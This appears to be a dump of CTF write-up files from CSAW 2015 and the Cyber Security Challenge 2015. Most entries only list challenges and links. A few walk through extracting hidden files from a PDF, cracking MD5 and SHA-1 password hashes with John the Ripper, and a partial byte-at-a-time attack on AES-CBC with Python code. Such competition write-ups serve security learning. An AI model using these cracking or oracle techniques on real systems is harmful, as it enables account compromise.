* <http://fadec0d3.blogspot.com/2015/09/csaw-2015-recon-trivia.html>
* <https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Trivia>
# CSAW QUALS 2015: trivia-2

**Category:** Trivia
**Points:** 10
**Solves:** 963
**Description:**

> No More Free __!


## Write-up

(TODO)

## Other write-ups and resources

* <http://fadec0d3.blogspot.com/2015/09/csaw-2015-recon-trivia.html>
* <https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Trivia>
# CSAW QUALS 2015: trivia-3

**Category:** Trivia
**Points:** 10
**Solves:** 1021
**Description:**

> This mode on x86 is generally referred to as ring -2.


## Write-up

(TODO)

## Other write-ups and resources

* <http://fadec0d3.blogspot.com/2015/09/csaw-2015-recon-trivia.html>
* <https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Trivia>
# CSAW QUALS 2015: trivia-4

**Category:** Trivia
**Points:** 10
**Solves:** 1083
**Description:**

> This vulnerability occurs when the incorrect timing/sequence of events may cause a bug.


## Write-up

(TODO)

## Other write-ups and resources

* <http://fadec0d3.blogspot.com/2015/09/csaw-2015-recon-trivia.html>
* <https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Trivia>
# CSAW QUALS 2015: trivia-5

**Category:** Trivia
**Points:** 10
**Solves:** 1016
**Description:**

> On Windows, loading a library and having it's code run in another process is called _ .


## Write-up

(TODO)

## Other write-ups and resources

* <http://fadec0d3.blogspot.com/2015/09/csaw-2015-recon-trivia.html>
* <https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Trivia>
# CSAW QUALS 2015: trivia-6

**Category:** Trivia
**Points:** 10
**Solves:** 551
**Description:**

> This Pentesting expert supplied HBO's Silicon Valley with technical advice in season 2. The flag is his twitter handle.
>
>


## Write-up

(TODO)

## Other write-ups and resources

* <http://fadec0d3.blogspot.com/2015/09/csaw-2015-recon-trivia.html>
* <https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Trivia>
# CSAW QUALS 2015: K_achieve-200

**Category:** Web
**Points:** 200
**Solves:** 17
**Description:**

> Can you beat it without taking damage?
>
> http://54.152.84.91
>
> HINT: State is split up into two parts
>
> HINT: The map is 256 x 256 and there are 8 types of tiles. Notice anything interesting about the length of the second chunk?


## Write-up

(TODO)

## Other write-ups and resources

* <http://itszn.com/blog/?p=20> 
# CSAW QUALS 2015: K_stairs-100

**Category:** Web
**Points:** 100
**Solves:** 123
**Description:**

> http://54.152.84.91
>
> beat the game!
>
> HINT: You need a [compass](http://zelda.wikia.com/wiki/Compass)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Web/K_-Stairs>
* <http://itszn.com/blog/?p=20>
 <http://blog.isis.poly.edu/2015/09/21/csaw-ctf-k-stairs.html>
# CSAW QUALS 2015: lawn-care-stimulator-200

**Category:** Web
**Points:** 200
**Solves:** 450
**Description:**

> http://54.165.252.74:8089/


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/csaw-quals-2015-lawn-care-simulator/>
* <http://www.securifera.com/blog/2015/09/23/csaw-2015-lawn-care-simulator/>
* <https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Web/Lawn-Care-Simulator>
* <http://blog.init-labs.org/2015/09/21/csaw-web-200-write-up/>
* <https://github.com/bl4de/ctf/blob/master/CSAW_CTF_2015/LawnCareimulator_Web200_writeup.md>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CSAWCTF/web/lawncaresimulator>
* <http://colin.keigher.ca/2015/09/csaw-ctf-2015-web-200-in-two-steps.html>
* <http://cafelinux.info/articles/writeups-csaw-2015-web-200-lawn-care-simulator>
* <https://github.com/p4-team/ctf/tree/master/2015-09-16-csaw/web_200_lawn_care_simulator>
* <http://blog.isis.poly.edu/2015/10/03/csaw-ctf-lawn-care.html>
# CSAW QUALS 2015: throwback-600

**Category:** Web
**Points:** 600
**Solves:** 62
**Description:**

> Programming is hard. CTF software is hard too. We broke our CTF software a few years ago and looks like we did it again this year
> :( :( :(
>
> HINT: If you are smart about it, you do not need to attack the CTF infrastructure.
>
> HINT: The source code of our CTF software is on our Github. Also if you tried the challenge with flag{} before, try again.


## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.init-labs.org/2015/09/21/csaw-web-600-write-up/>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CSAWCTF/web/throwback>
* <http://blog.isis.poly.edu/2015/09/21/csaw-ctf-throwback.html>
# CSAW QUALS 2015: weebdate-500

**Category:** Web
**Points:** 500
**Solves:** 69
**Description:**

> Since the Ashley Madison hack, a lot of high profile socialites have scrambled to find the hottest new dating sites. Unfortunately for us, that means they're taking more safety measures and only using secure websites. We have some suspicions that Donald Trump is using a new dating site called "weebdate" and also selling cocaine to fund his presidential campaign. We need you to get both his password and his 2 factor TOTP key so we can break into his profile and investigate.
>
> Flag is md5($totpkey.$password)
>
> http://54.175.160.194/


## Write-up

(TODO)

## Other write-ups and resources

* <http://l.avala.mp/blog/csaw-2015-web-500-writeup/>
* <http://buer.haus/2015/09/20/csaw-2015-web-500-weebdate-writeup/>
* <http://w00tsec.blogspot.com/2015/09/csaw-2015-write-up-weebdate-web500.html>
* <http://blog.init-labs.org/2015/09/21/csaw-web-500-write-up/>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CSAWCTF/web/weebdate>
* <https://github.com/p4-team/ctf/tree/master/2015-09-16-csaw/web_500_weebdate>
* <http://blog.isis.poly.edu/2015/10/03/csaw-ctf-weebdate.html>
# CSAW FINALS CTF 2015: check-_plz

**Category:** Cryptography
**Points:** 250
**Solves:** 14
**Description:**

> We just recently set up our crypto for a new project. We'll give you the flag if you can guess the resulting mac. Try the stripped down version here:
> 
> nc 52.91.89.84 4000
> 
> source : <https://gist.github.com/gsingh93/755905ada3053e0365c1>
> 
> -Facebook (Gulshan Singh)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CSAW FINALS CTF 2015: Slabs of Platinum

**Category:** Cryptography
**Points:** 500
**Solves:** 6
**Description:**

> You showed great skill with the last target! But we have found the encrypted image and remnants of an even more complex encryption scheme.
> 
> Can you help us?
> 
> -Trail of Bits (quend)
> 
> [slabs_of_platinum_7f07f420a08ea404b88c4888f23c70e3](./slabs_of_platinum_7f07f420a08ea404b88c4888f23c70e3)
> 
> [real_hackers_use.sage_2f88c5095680fd3bb890bfc088ea6852](./real_hackers_use.sage_2f88c5095680fd3bb890bfc088ea6852)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/negasora/CTFWriteups/tree/master/CSAW-Finals-2015/Slabs-of-Platinum---Crypto-500>
# CSAW FINALS CTF 2015: boombox

**Category:** Exploitation
**Points:** 500
**Solves:** 1
**Description:**

> 'The latest and greatest bumpin' new streaming service has just hit the web, have you seen it?
> 
> AppJailLauncher.exe /network /key:key /port:4444 /timeout:120 ./boombox.exe'
> 
> Password: CSAW2015
> 
> UPDATE: The challenge is hosted on <http://40.117.40.124:4444/>
> 
> Sorry
> 
> ~Eric
> 
> -Microsoft (Markus Gaasedelen)
> 
> [boombox.7z](./boombox.7z)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_finals_2015/exploitation500_boombox/boombox_writeup.md>
# CSAW FINALS CTF 2015: hipster

**Category:** Exploitation
**Points:** 250
**Solves:** 11
**Description:**

> Hipster Hitler's got our flag! Help us retrieve it!
> 
> nc 54.164.94.180 1939
> 
> -Raytheon (Fuzyll & Cody)
> 
> [hipster_0ddd47929dca935698b0bb1463d8ae52](./hipster_0ddd47929dca935698b0bb1463d8ae52)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_finals_2015/exploitation250_hipster/exploitation250_hipster_exploit.py>
# CSAW FINALS CTF 2015: StringIPC

**Category:** Exploitation
**Points:** 500
**Solves:** 3
**Description:**

> I've always wanted to try writing a kernel module. I think I covered all my bases but I'm not sure.
> 
> If your VM hangs, here is an IP to reboot your VM <http://104.236.83.127/reboot>
> 
> Post Event Update
> 
> StringIPC_Updated contains the exact source of the module running on the VM
> 
> -Azimuth Security (Michael Coppola)
> 
> [StringIPC_427a532edb436a38d1e652bbc5732aa4.tgz](./StringIPC_427a532edb436a38d1e652bbc5732aa4.tgz)
> 
> [StringIPC_Updated_3d38ffc5ca8932e5b60bde85df983ca7.tar.gz](./StringIPC_Updated_3d38ffc5ca8932e5b60bde85df983ca7.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* <http://itszn.com/blog/?p=21>
# CSAW FINALS CTF 2015: Mandiant

**Category:** Forensic
**Points:** 300
**Solves:** 15
**Description:**

> We found this file. Help Mandiant figure out what APT1 is trying to send.
> 
> hint check out free_file_camouflage
> 
> -Trail of Bits (quend)
> 
> [Mandiant_c920fc463eaf996489749457abc9b2eb.pdf](./Mandiant_c920fc463eaf996489749457abc9b2eb.pdf)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on a writeup by [krx](https://github.com/krx/CTF-Writeups/tree/master/CSAW%2015%20Finals/for300%20-%20Mandiant).

We are given a PDF that contains an EmbeddedFile object stream, see [7.11.4 of the official PDF specification by Adobe](http://www.adobe.com/content/dam/Adobe/en/devnet/acrobat/pdfs/PDF32000_2008.pdf).

Using `qpdf` and a common text editor, we can extract the embedded file (base64 encoded) in a simple manner:

```bash
$ qpdf --qdf --object-streams=disable Mandiant_c920fc463eaf996489749457abc9b2eb.pdf out.pdf
```

![](./pdf-embedded-file.png)

We decode it using `base64 --decode` to find a PNG:

```bash
$ cat out.b64 | tr -d '\n' | b64d > pic.png 
$ file pic.png
pic.png: PNG image data, 610 x 467, 8-bit/color RGBA, non-interlaced
```

The PNG contains a 7-zip archive, which we extract using `scalpel` using a modified version of [this config](https://asecuritysite.com/scalpel.conf.txt):

```bash
$ binwalk pic.png | grep -v Zlib
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 610 x 467, 8-bit/color RGBA, non-interlaced
160173        0x271AD         7-zip archive data, version 0.4
$ scalpel -vc scalpel.conf pic.png
$ tree scalpel-output/
scalpel-output/
├── 7z-10-0
│   └── 00000000.7z
└── audit.txt

1 directory, 2 files
```

Inside the 7z there is a JPG (also base64 encoded), which we extract using `7z`:

```bash
+bash-4.3$ cd 7z-10-0/
+bash-4.3$ ls
00000000.7z
+bash-4.3$ 7z x 00000000.7z -oout

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: 00000000.7z

Extracting  secret.txt

Everything is Ok

Size:       58375
Compressed: 43850
+bash-4.3$ tree out/
out/
└── secret.txt

0 directories, 1 file
+bash-4.3$ file out/secret.txt 
out/secret.txt: ASCII text
+bash-4.3$ cd out/
+bash-4.3$ cat secret.txt | tr -d '\n' | base64 --decode > pic.jpg
+bash-4.3$ file pic.jpg 
pic.jpg: JPEG image data
```

Using any hexeditor or `strings`, we find that the JPG contains two base64 encoded blobs:

```bash
$ strings -a pic.jpg 
b#o]
Y2EB
 V~D
[...]
"aKxw
S#UH
VVGEC8uGDQuNhhk6FKg0ICF9jVAUS54zurveSzXcwE9MsIHIZPuvP6vrSDgwULy5Kvm/wPe3zxddM4SSPgvWIg==
XQN6Y6QIpfofWw857i5DK[...]
$ strings -a pic.jpg | tail -n2 > strings.b64
```

However, both blobs do not seem to be anything obvious at first:

```bash
$ sed '1q;d' strings.b64 | b64d | xxd
0000000: 5551 840b cb86 0d0b 8d86 193a 14a8 3420  UQ.........:..4 
0000010: 217d 8d50 144b 9e33 babb de4b 35dc c04f  !}.P.K.3...K5..O
0000020: 4cb0 81c8 64fb af3f abeb 4838 3050 bcb9  L...d..?..H80P..
0000030: 2af9 bfc0 f7b7 cf17 5d33 8492 3e0b d622  *.......]3..>.."
$ sed '2q;d' strings.b64 | b64d | xxd
0000000: 5d03 7a63 a408 a5fa 1f5b 0f39 ee2e 432b  ].zc.....[.9..C+
0000010: bd55 57e0 0cc3 7aa4 9797 c906 abc4 4e82  .UW...z.......N.
[...]
0003450: c273 cfa0 b5ca 8535 64b4 40a6 501e f7de  .s.....5d.@.P...
0003460: b749 d99b 18ea 3dd7 af98 e685 295f 312e  .I....=.....)_1.
0003470: 7a35 2b36 ca13 86a0 9265 6802 f0f8 4e3d  z5+6.....eh...N=
```

As [this writeup](https://github.com/krx/CTF-Writeups/tree/master/CSAW%2015%20Finals/for300%20-%20Mandiant) suggests, we have to use a program called `Free File Camouflage` to extract a hdden file from the blob(s) - an ELF.

The final step is to run the ELF to receive the flag `flag{s3v3r4l_l4y3r5_d33p_&_2m4ny_l4yers_w1d3}`.

## Other write-ups and resources

* <https://github.com/kareemroks101/CTF-Writeups/tree/master/CSAW%2015%20Finals/for300%20-%20Mandiant>
# CSAW FINALS CTF 2015: Phish It, Phish It Good

**Category:** Forensic
**Points:** 100
**Solves:** 7
**Description:**

> Someone got phished after running an executable, help me find out what info the attacker obtained.
> 
> Note: The format for this challenge is key{}
> 
> -Brad Antoniewicz
> 
> [bustincapz_50A06F5C67A65D16E40A8A16596C99C2.7z](./bustincapz_50A06F5C67A65D16E40A8A16596C99C2.7z)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CSAW FINALS CTF 2015: ransomewhere

**Category:** Forensic
**Points:** 300
**Solves:** 15
**Description:**

> We got hit by some randsomware and we lost our most important file. Please help use recover it.
> 
> -TwoSigma (Jay Smith)
> 
> [randsomewhere_0bcb28bec3683610d7048879a1374335.img.zip](./randsomewhere_0bcb28bec3683610d7048879a1374335.img.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/kareemroks101/CTF-Writeups/tree/master/CSAW%2015%20Finals/for300%20-%20randsomewhere>
# CSAW FINALS CTF 2015: 1337

**Category:** Grabbag
**Points:** 150
**Solves:** 14
**Description:**

> Bring me a receipt with the grand total (items + tax) of $13.37. There are some restrictions:
> 
> 
> The receipt must be from within 1/2 mile of 6 MetroTech.
> 
> The receipt must be printed on receipt paper.
> 
> The receipt must be itemized with each item’s price shown
> 
> No more than 4 items can be used to equal $13.37.
> 
> The purchase must be during the hours of the competition.
> 
> You must show the purchased items to the judges.
> 
> Tips, discretionary costs, and haggled costs do not count. Ideally every item would have a price sticker on it.
> 
> Flea Markets are not allowed.
> 
> Quantities are whole numbers. You can't use something measured by weight or equivalent.
> 
> -Trail of Bits (Ryan Stortz)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CSAW FINALS CTF 2015: Late Night Smash

**Category:** Grabbag
**Points:** 50
**Solves:** 5
**Description:**

> Beat Kyle in a standard four stock.
> 
> Best of 1


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CSAW FINALS CTF 2015: MOAR CHESS

**Category:** Grabbag
**Points:** 150
**Solves:** 4
**Description:**

> Play a 3v1 chess game against Kevin.
> 
> 
> If you want to play just let Kevin know. We can set the boards up.
> 
> 
> Here are the rules:
> 
> 
> The standard rules of chess
> 
> Kevin plays 3 boards at once against 3 players from a team
> 
> A team can play at most 3 times an hour but it is still up to Kevin to accept or decline a challenge or even enforce this rule
> 
> You may not use an engine or other computer support. Only the players sitting at the table may provide moves
> 
> Kevin has 7 minutes on each board, each competitor has 5 minutes. (To allow time to move between boards)
> 
> Illegal moves that are called out are considered wins for either side
> 
> Kevin always plays white
> 
> The clock confirms the move meaning when you hit the clock you have confirmed your move and it is immutable
> 
> You must win 2 out of the 3 games.


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CSAW FINALS CTF 2015: blox

**Category:** Pwnadventurez
**Points:** 250
**Solves:** 6
**Description:**

> Reversing
> 
> This challenge can be found in PwnAdventureZ
> 
> -Vector35
> 
> [PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip](./../PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <http://andrewdutcher.com/view/21/pwn-adventure-z---writeup>
# CSAW FINALS CTF 2015: CreditForCredits

**Category:** Pwnadventurez
**Points:** 25
**Solves:** 7
**Description:**

> Gameplay
> 
> This challenge can be found in PwnAdventureZ
> 
> -Vector35
> 
> [PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip](./../PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <http://andrewdutcher.com/view/21/pwn-adventure-z---writeup>
# CSAW FINALS CTF 2015: get_flag

**Category:** Pwnadventurez
**Points:** 400
**Solves:** 1
**Description:**

> Pwnable
> 
> This challenge can be found in PwnAdventureZ
> 
> -Vector35
> 
> [PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip](./../PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <http://andrewdutcher.com/view/21/pwn-adventure-z---writeup>
# CSAW FINALS CTF 2015: GreetingsEarthling

**Category:** Pwnadventurez
**Points:** 25
**Solves:** 10
**Description:**

> Forensics
> 
> This challenge can be found in PwnAdventureZ
> 
> -Vector35
> 
> [PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip](./../PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <http://andrewdutcher.com/view/21/pwn-adventure-z---writeup>
# CSAW FINALS CTF 2015: HiddenCave

**Category:** Pwnadventurez
**Points:** 150
**Solves:** 9
**Description:**

> Reversing
> 
> This challenge can be found in PwnAdventureZ
> 
> -Vector35
> 
> [PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip](./../PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <http://andrewdutcher.com/view/21/pwn-adventure-z---writeup>
# CSAW FINALS CTF 2015: memory_disclosure_flag

**Category:** Pwnadventurez
**Points:** 500
**Solves:** 0
**Description:**

> Pwnable
> 
> This flag can be found in PwnAdventureZ
> 
> -Vector35
> 
> [PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip](../PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <http://andrewdutcher.com/view/21/pwn-adventure-z---writeup>
# CSAW FINALS CTF 2015: QuarantineBreaker

**Category:** Pwnadventurez
**Points:** 250
**Solves:** 6
**Description:**

> Reversing
> 
> This challenge can be found in PwnAdventureZ
> 
> -Vector35
> 
> [PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip](./../PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <http://andrewdutcher.com/view/21/pwn-adventure-z---writeup>
# CSAW FINALS CTF 2015 write-ups

* <https://ctf.isis.poly.edu/>
* [Scoreboard](https://ctf.isis.poly.edu/scoreboard) or [local alternative](./scoreboard)

## Completed write-ups

* [forensic/mandiant](forensic/mandiant)

## External write-ups only

* [cryptography/slabs-of-platinum](cryptography/slabs-of-platinum)
* [exploitation/boombox](exploitation/boombox)
* [exploitation/hipster](exploitation/hipster)
* [exploitation/stringipc](exploitation/stringipc)
* [forensic/ransomewhere](forensic/ransomewhere)
* [pwnadventurez/blox](pwnadventurez/blox)
* [pwnadventurez/creditforcredits](pwnadventurez/creditforcredits)
* [pwnadventurez/get-flag](pwnadventurez/get-flag)
* [pwnadventurez/greetingsearthling](pwnadventurez/greetingsearthling)
* [pwnadventurez/hiddencave](pwnadventurez/hiddencave)
* [pwnadventurez/memory-disclosure-flag](pwnadventurez/memory-disclosure-flag)
* [pwnadventurez/quarantinebreaker](pwnadventurez/quarantinebreaker)
* [trivia/sanity-check](trivia/sanity-check)
* [web/tbbpe](web/tbbpe)

## Missing write-ups

* [cryptography/check-plz](cryptography/check-plz)
* [forensic/phish-it-phish-it-good](forensic/phish-it-phish-it-good)
* [grabbag/1337](grabbag/1337)
* [grabbag/late-night-smash](grabbag/late-night-smash)
* [grabbag/moar-chess](grabbag/moar-chess)
* [reversing/cookie-maze](reversing/cookie-maze)
* [reversing/pwning-a-locked-container-plc](reversing/pwning-a-locked-container-plc)
* [reversing/return-of-the-wieners](reversing/return-of-the-wieners)
* [reversing/wyvern2](reversing/wyvern2)
* [web/animewall](web/animewall)# CSAW FINALS CTF 2015: cookie_maze

**Category:** Reversing
**Points:** 400
**Solves:** 3
**Description:**

> Ever feel like a rat trapped in a maze? There's a flag somewhere in this binary but I just can't seem to find it.
> 
> If you don't have a OS X box you can ssh here after requesting it.
> 
> ssh 0.tcp.ngrok.io -p 47136
> 
> ~Update new port is 47136
> 
> Hints:
> 
> 1 - <https://www.mikeash.com/pyblog/friday-qa-2013-01-11-mach-exception-handlers.html>
> 
> 2 - <https://github.com/gdbinit/readmem>
> 
> 3 - If an exception handler returns success(0) the binary continues executing even if the exception was not handled if it returns failure(5) it always exits
> 
> -blankwall
> 
> cookie_maze_8d8023f8f7c38181e8abd9c5c70d527b


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CSAW FINALS CTF 2015: Pwning a Locked Container (P.L.C)

**Category:** Reversing
**Points:** 400
**Solves:** 3
**Description:**

> PLC challenge round 2.
> 
> -DHS


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CSAW FINALS CTF 2015: Return of the Wieners

**Category:** Reversing
**Points:** 300
**Solves:** 7
**Description:**

> Wieners was too hard last year so now it's been made easier.
> 
> Note: The format for this challenge is key{}.
> 
> -Brad Antoniewicz
> 
> [return_of_the_wieners_fdcfa9d04156803d4976693abe21aac1](./return_of_the_wieners_fdcfa9d04156803d4976693abe21aac1)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CSAW FINALS CTF 2015: wyvern2

**Category:** Reversing
**Points:** 500
**Solves:** 11
**Description:**

> The dragon has returned! This time stronger....
> 
> Brute strength has failed and now only magic can save us. Use your skills to defeat the dragon and win the princess.
> 
> -Trail of Bits (quend)
> 
> [wyvern2_9ea71d6a870c4f4e8f8e1859a0f628eb](./wyvern2_9ea71d6a870c4f4e8f8e1859a0f628eb)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CSAW FINALS CTF 2015: sanity_check

**Category:** Trivia
**Points:** 100
**Solves:** 12
**Description:**

> nc 54.174.215.251 1337
> 
> hi there! do you know this usually useless trick? no? well, that's too bad :(
> 
> -crowell
> 
> [libc.so.6_3f6aaa980b58f7c7590dee12d731e099](./libc.so.6_3f6aaa980b58f7c7590dee12d731e099)
> 
> [sanity_check_76955449d82f05cbd7f84fa011da93ce](./sanity_check_76955449d82f05cbd7f84fa011da93ce)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_finals_2015/trivia100_sanitycheck/trivia100_sanitycheck_exploit.py>
# CSAW FINALS CTF 2015: animewall

**Category:** Web
**Points:** 420
**Solves:** 0
**Description:**

> WTF dad installed this firewall and now i cant visit my favorite anime websites.
> 
> can you unload the module for me?
> 
> i believe in you, and more importantly, i believe in the you that believes in you....
> 
> if i cant see animes i guess im gonna just blizz it...
> 
> lain@54.85.189.105
> 
> password is lain
> 
> -crowell


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CSAW FINALS CTF 2015: TBBPE

**Category:** Web
**Points:** 400
**Solves:** 0
**Description:**

> This is The Best Blogging Platform Ever...
> 
> only the most exclusive members are ever invited. We need you to break into the site and cast a vote for your team.
> 
> <https://csaw2015-the-blog.herokuapp.com/>
> 
> HINT: There are two separate bugs required to solve this challenge.
> 
> -Github (Ben Toews)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/mastahyeti/the-blog/blob/master/solution.md>
# Cyber Security Challenge 2015: Crack the Hash

**Category:** Cryptography
**Points:** 10
**Description:**

> It’s happened again! Some of our beloved friends at linkedin.com forgot to salt their password hashes. Due to a rather interesting SQL injection issue, a hacker group has published the following MD5 hash online! Can you crack it?
>
> Hash: `365d38c60c4e98ca5ca6dbc02d396e53`

## Write-up

A quick [Google search](https://www.google.com/search?q=365d38c60c4e98ca5ca6dbc02d396e53) reveals that [`365d38c60c4e98ca5ca6dbc02d396e53` is the MD5 hash for `password12345`](http://md5.gromweb.com/?md5=365d38c60c4e98ca5ca6dbc02d396e53), which is the flag.

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: Guess the Algorithm

**Category:** Cryptography
**Points:** 15
**Description:**

> When will they finally learn to hash passwords! Another Fortune 500 company breached… Can you recover the password? Unfortunately we don’t have any information on the hashing algorithm…
>
> Hash: `06f8aa28b9237866e3e289f18ade19e1736d809d`

## Write-up

Let’s save the hash to a file and fire up [John the Ripper](http://www.openwall.com/john/):

```bash
$ echo '06f8aa28b9237866e3e289f18ade19e1736d809d' > hash.txt

$ john hash.txt
Warning: detected hash type "raw-sha1", but the string is also recognized as "raw-sha1-linkedin"
Use the "--format=raw-sha1-linkedin" option to force loading these as that type instead
Warning: detected hash type "raw-sha1", but the string is also recognized as "raw-sha"
Use the "--format=raw-sha" option to force loading these as that type instead
Warning: detected hash type "raw-sha1", but the string is also recognized as "raw-sha1-ng"
Use the "--format=raw-sha1-ng" option to force loading these as that type instead
Loaded 1 password hash (Raw SHA-1 [128/128 SSE2 intrinsics 4x])
guesses: 0  time: 0:00:00:36 0.00% (3)  c/s: 12146K  trying: slwerat - slweras
jrahyn+          (?)
guesses: 1  time: 0:00:00:37 DONE (Thu Mar  5 05:47:17 2015)  c/s: 12159K  trying: jrahyn+ - jrahyni
Use the "--show" option to display all of the cracked passwords reliably
```

That first warning is what the challenge description hinted at: this is a LinkedIn hash. The above command already gave us the solution, but just to make sure we recover the expected password, let’s explicitly tell `john` to use the `raw-sha1-linkedin` format:

```
$ john --format=raw-sha1-linkedin hash.txt
Loaded 1 password hash (Raw SHA-1 LinkedIn [128/128 SSE2 intrinsics 4x])
jrahyn+          (?)
guesses: 1  time: 0:00:00:36 DONE (Thu Mar  5 05:51:29 2015)  c/s: 12531K  trying: jrahyn+ - jrahyni
Use the "--show" option to display all of the cracked passwords reliably

$ john --show hash.txt
?:jrahyn+

1 password hash cracked, 0 left
```

The username is `?` and the password is `jrahyn+`.

## Other write-ups and resources

* none yet
# Cyber Security Challenge 2015: One Way

**Category:** Cryptography
**Points:** 100
**Description:**

> We want our employees to be able to send us confidential information which only we can decrypt. Since we don’t believe in PKI (for religious reasons), we made our own crypto system. (Homemade is always better!). We prevent tampering, we took some precautions: A salt is added to each request and the IV is chosen at random for every connection. Take a look at [the given `clientFramework.py` file](clientFramework.py) for more info on how to use our crypto system.

## Write-up

_By Ruben Tytgat on <https://ruben.infogroep.be/?p=12>._

Yesterday I participated in the Cyber Security Challenge with my friends Kwinten, Tom and Youri (as team Infogroep).  One of the challenges I helped break was the 'One Way' crypto challenge. This was a fun challenge, so I wanted to share our solution.

The challenge consists of a server which encrypts your input using AES in CBC mode with an unknown key. The objective is to retrieve the salt this server appends to your input before it encrypts it. The server's code is mostly available.

Let's first have a look at the information we have:
* The encryption used is AES in CBC mode.
* Block size is 16 characters
* The flag is a salt appended to your input
* The flag is 8 characters long
* The IV is not randomized between requests
* We have no access to the key used for encryption
* We have most of the server's code

The encryption being applied on our input is AES in CBC mode. This would make the challenge a lot harder if the salt we are looking for were longer. As it turns out, however, in this challenge the salt is only 8 characters. This is smaller than our block size, so we can encrypt the entire salt in 1 block. If we focus only on the first block in the encryption result, this effectively makes the CBC encryption equivalent to a simple ECB encryption where our input is first XOR'ed with the IV.

Since we don't have the key, we can't decrypt the generated blocks. The trick here is that we don't have to. Due to the way the salt is appended to our input, it is extremely vulnerable to a padding attack.

Suppose the XOR with the IV is not present. In that case, we are just dealing with an AES encryption where the key is unknown. We can simply regard this AES encryption as a hashing algorithm and build up a rainbow table. The 8-character salt makes for a set of 2^64 possibilities, which is too much to be feasibly bruteforced. This is where the padding attack comes in. As mentioned before, we only keep the first block of the encryption result. We can also decide ourselves how much of the salt is present in the first block of the result by selecting an appropriate length for our input string. This way we can bruteforce the salt letter by letter and limit the set of possibilities to 2048, which is very feasible. For example, to calculate a rainbow table for the first character, we encrypt all the following strings:

	aaaaaaaaaaaaaaa\0x00
	aaaaaaaaaaaaaaa\0x01
	aaaaaaaaaaaaaaa\0x02
	...
	aaaaaaaaaaaaaaa\0xFF

We then encrypt only the 15 a's, and the server will pull in 1 character of the salt.

	aaaaaaaaaaaaaaas

We check the generated hash in our rainbow table and thus obtain the first character. Then we continue with the next character:

	aaaaaaaaaaaaaas\0x00
	aaaaaaaaaaaaaas\0x01
	aaaaaaaaaaaaaas\0x02
	...
	aaaaaaaaaaaaaas\0xFF

And so on until we have the full salt.

However, we can't actually directly input to the AES input, but have to first go through the XOR with the IV. Fortunately, an XOR is reversible by XOR'ing with the same value again, and the IV is not randomized between encryptions, but predictable. This means we can actually send raw data to the AES input by predicting the next IV and XOR'ing it with our input. We can now write a function that evades the IV XOR on our input and encrypts our input directly with the AES encryptor. We also update the original encrypt function so it returns the IV and the encrypted data instead of uselessly printing to STDOUT. Lastly, we need a function to predict the IV, which we can simply copy from the server code.

```python
def updateIV(currentIV):
	nextIV = ""
	for i in range(0, len(currentIV)):
		k = ord(currentIV[i])
		k += 42
		k %= 0xFF
		nextIV += chr(k)
	return nextIV

def encrypt(plaintext):

	# Send the data
	send_blob(s, plaintext)

	# Receive the data (yawn)
	data = recv_blob(s)

	# The IV is the first 16 bytes of the data
	iv = data[:16]

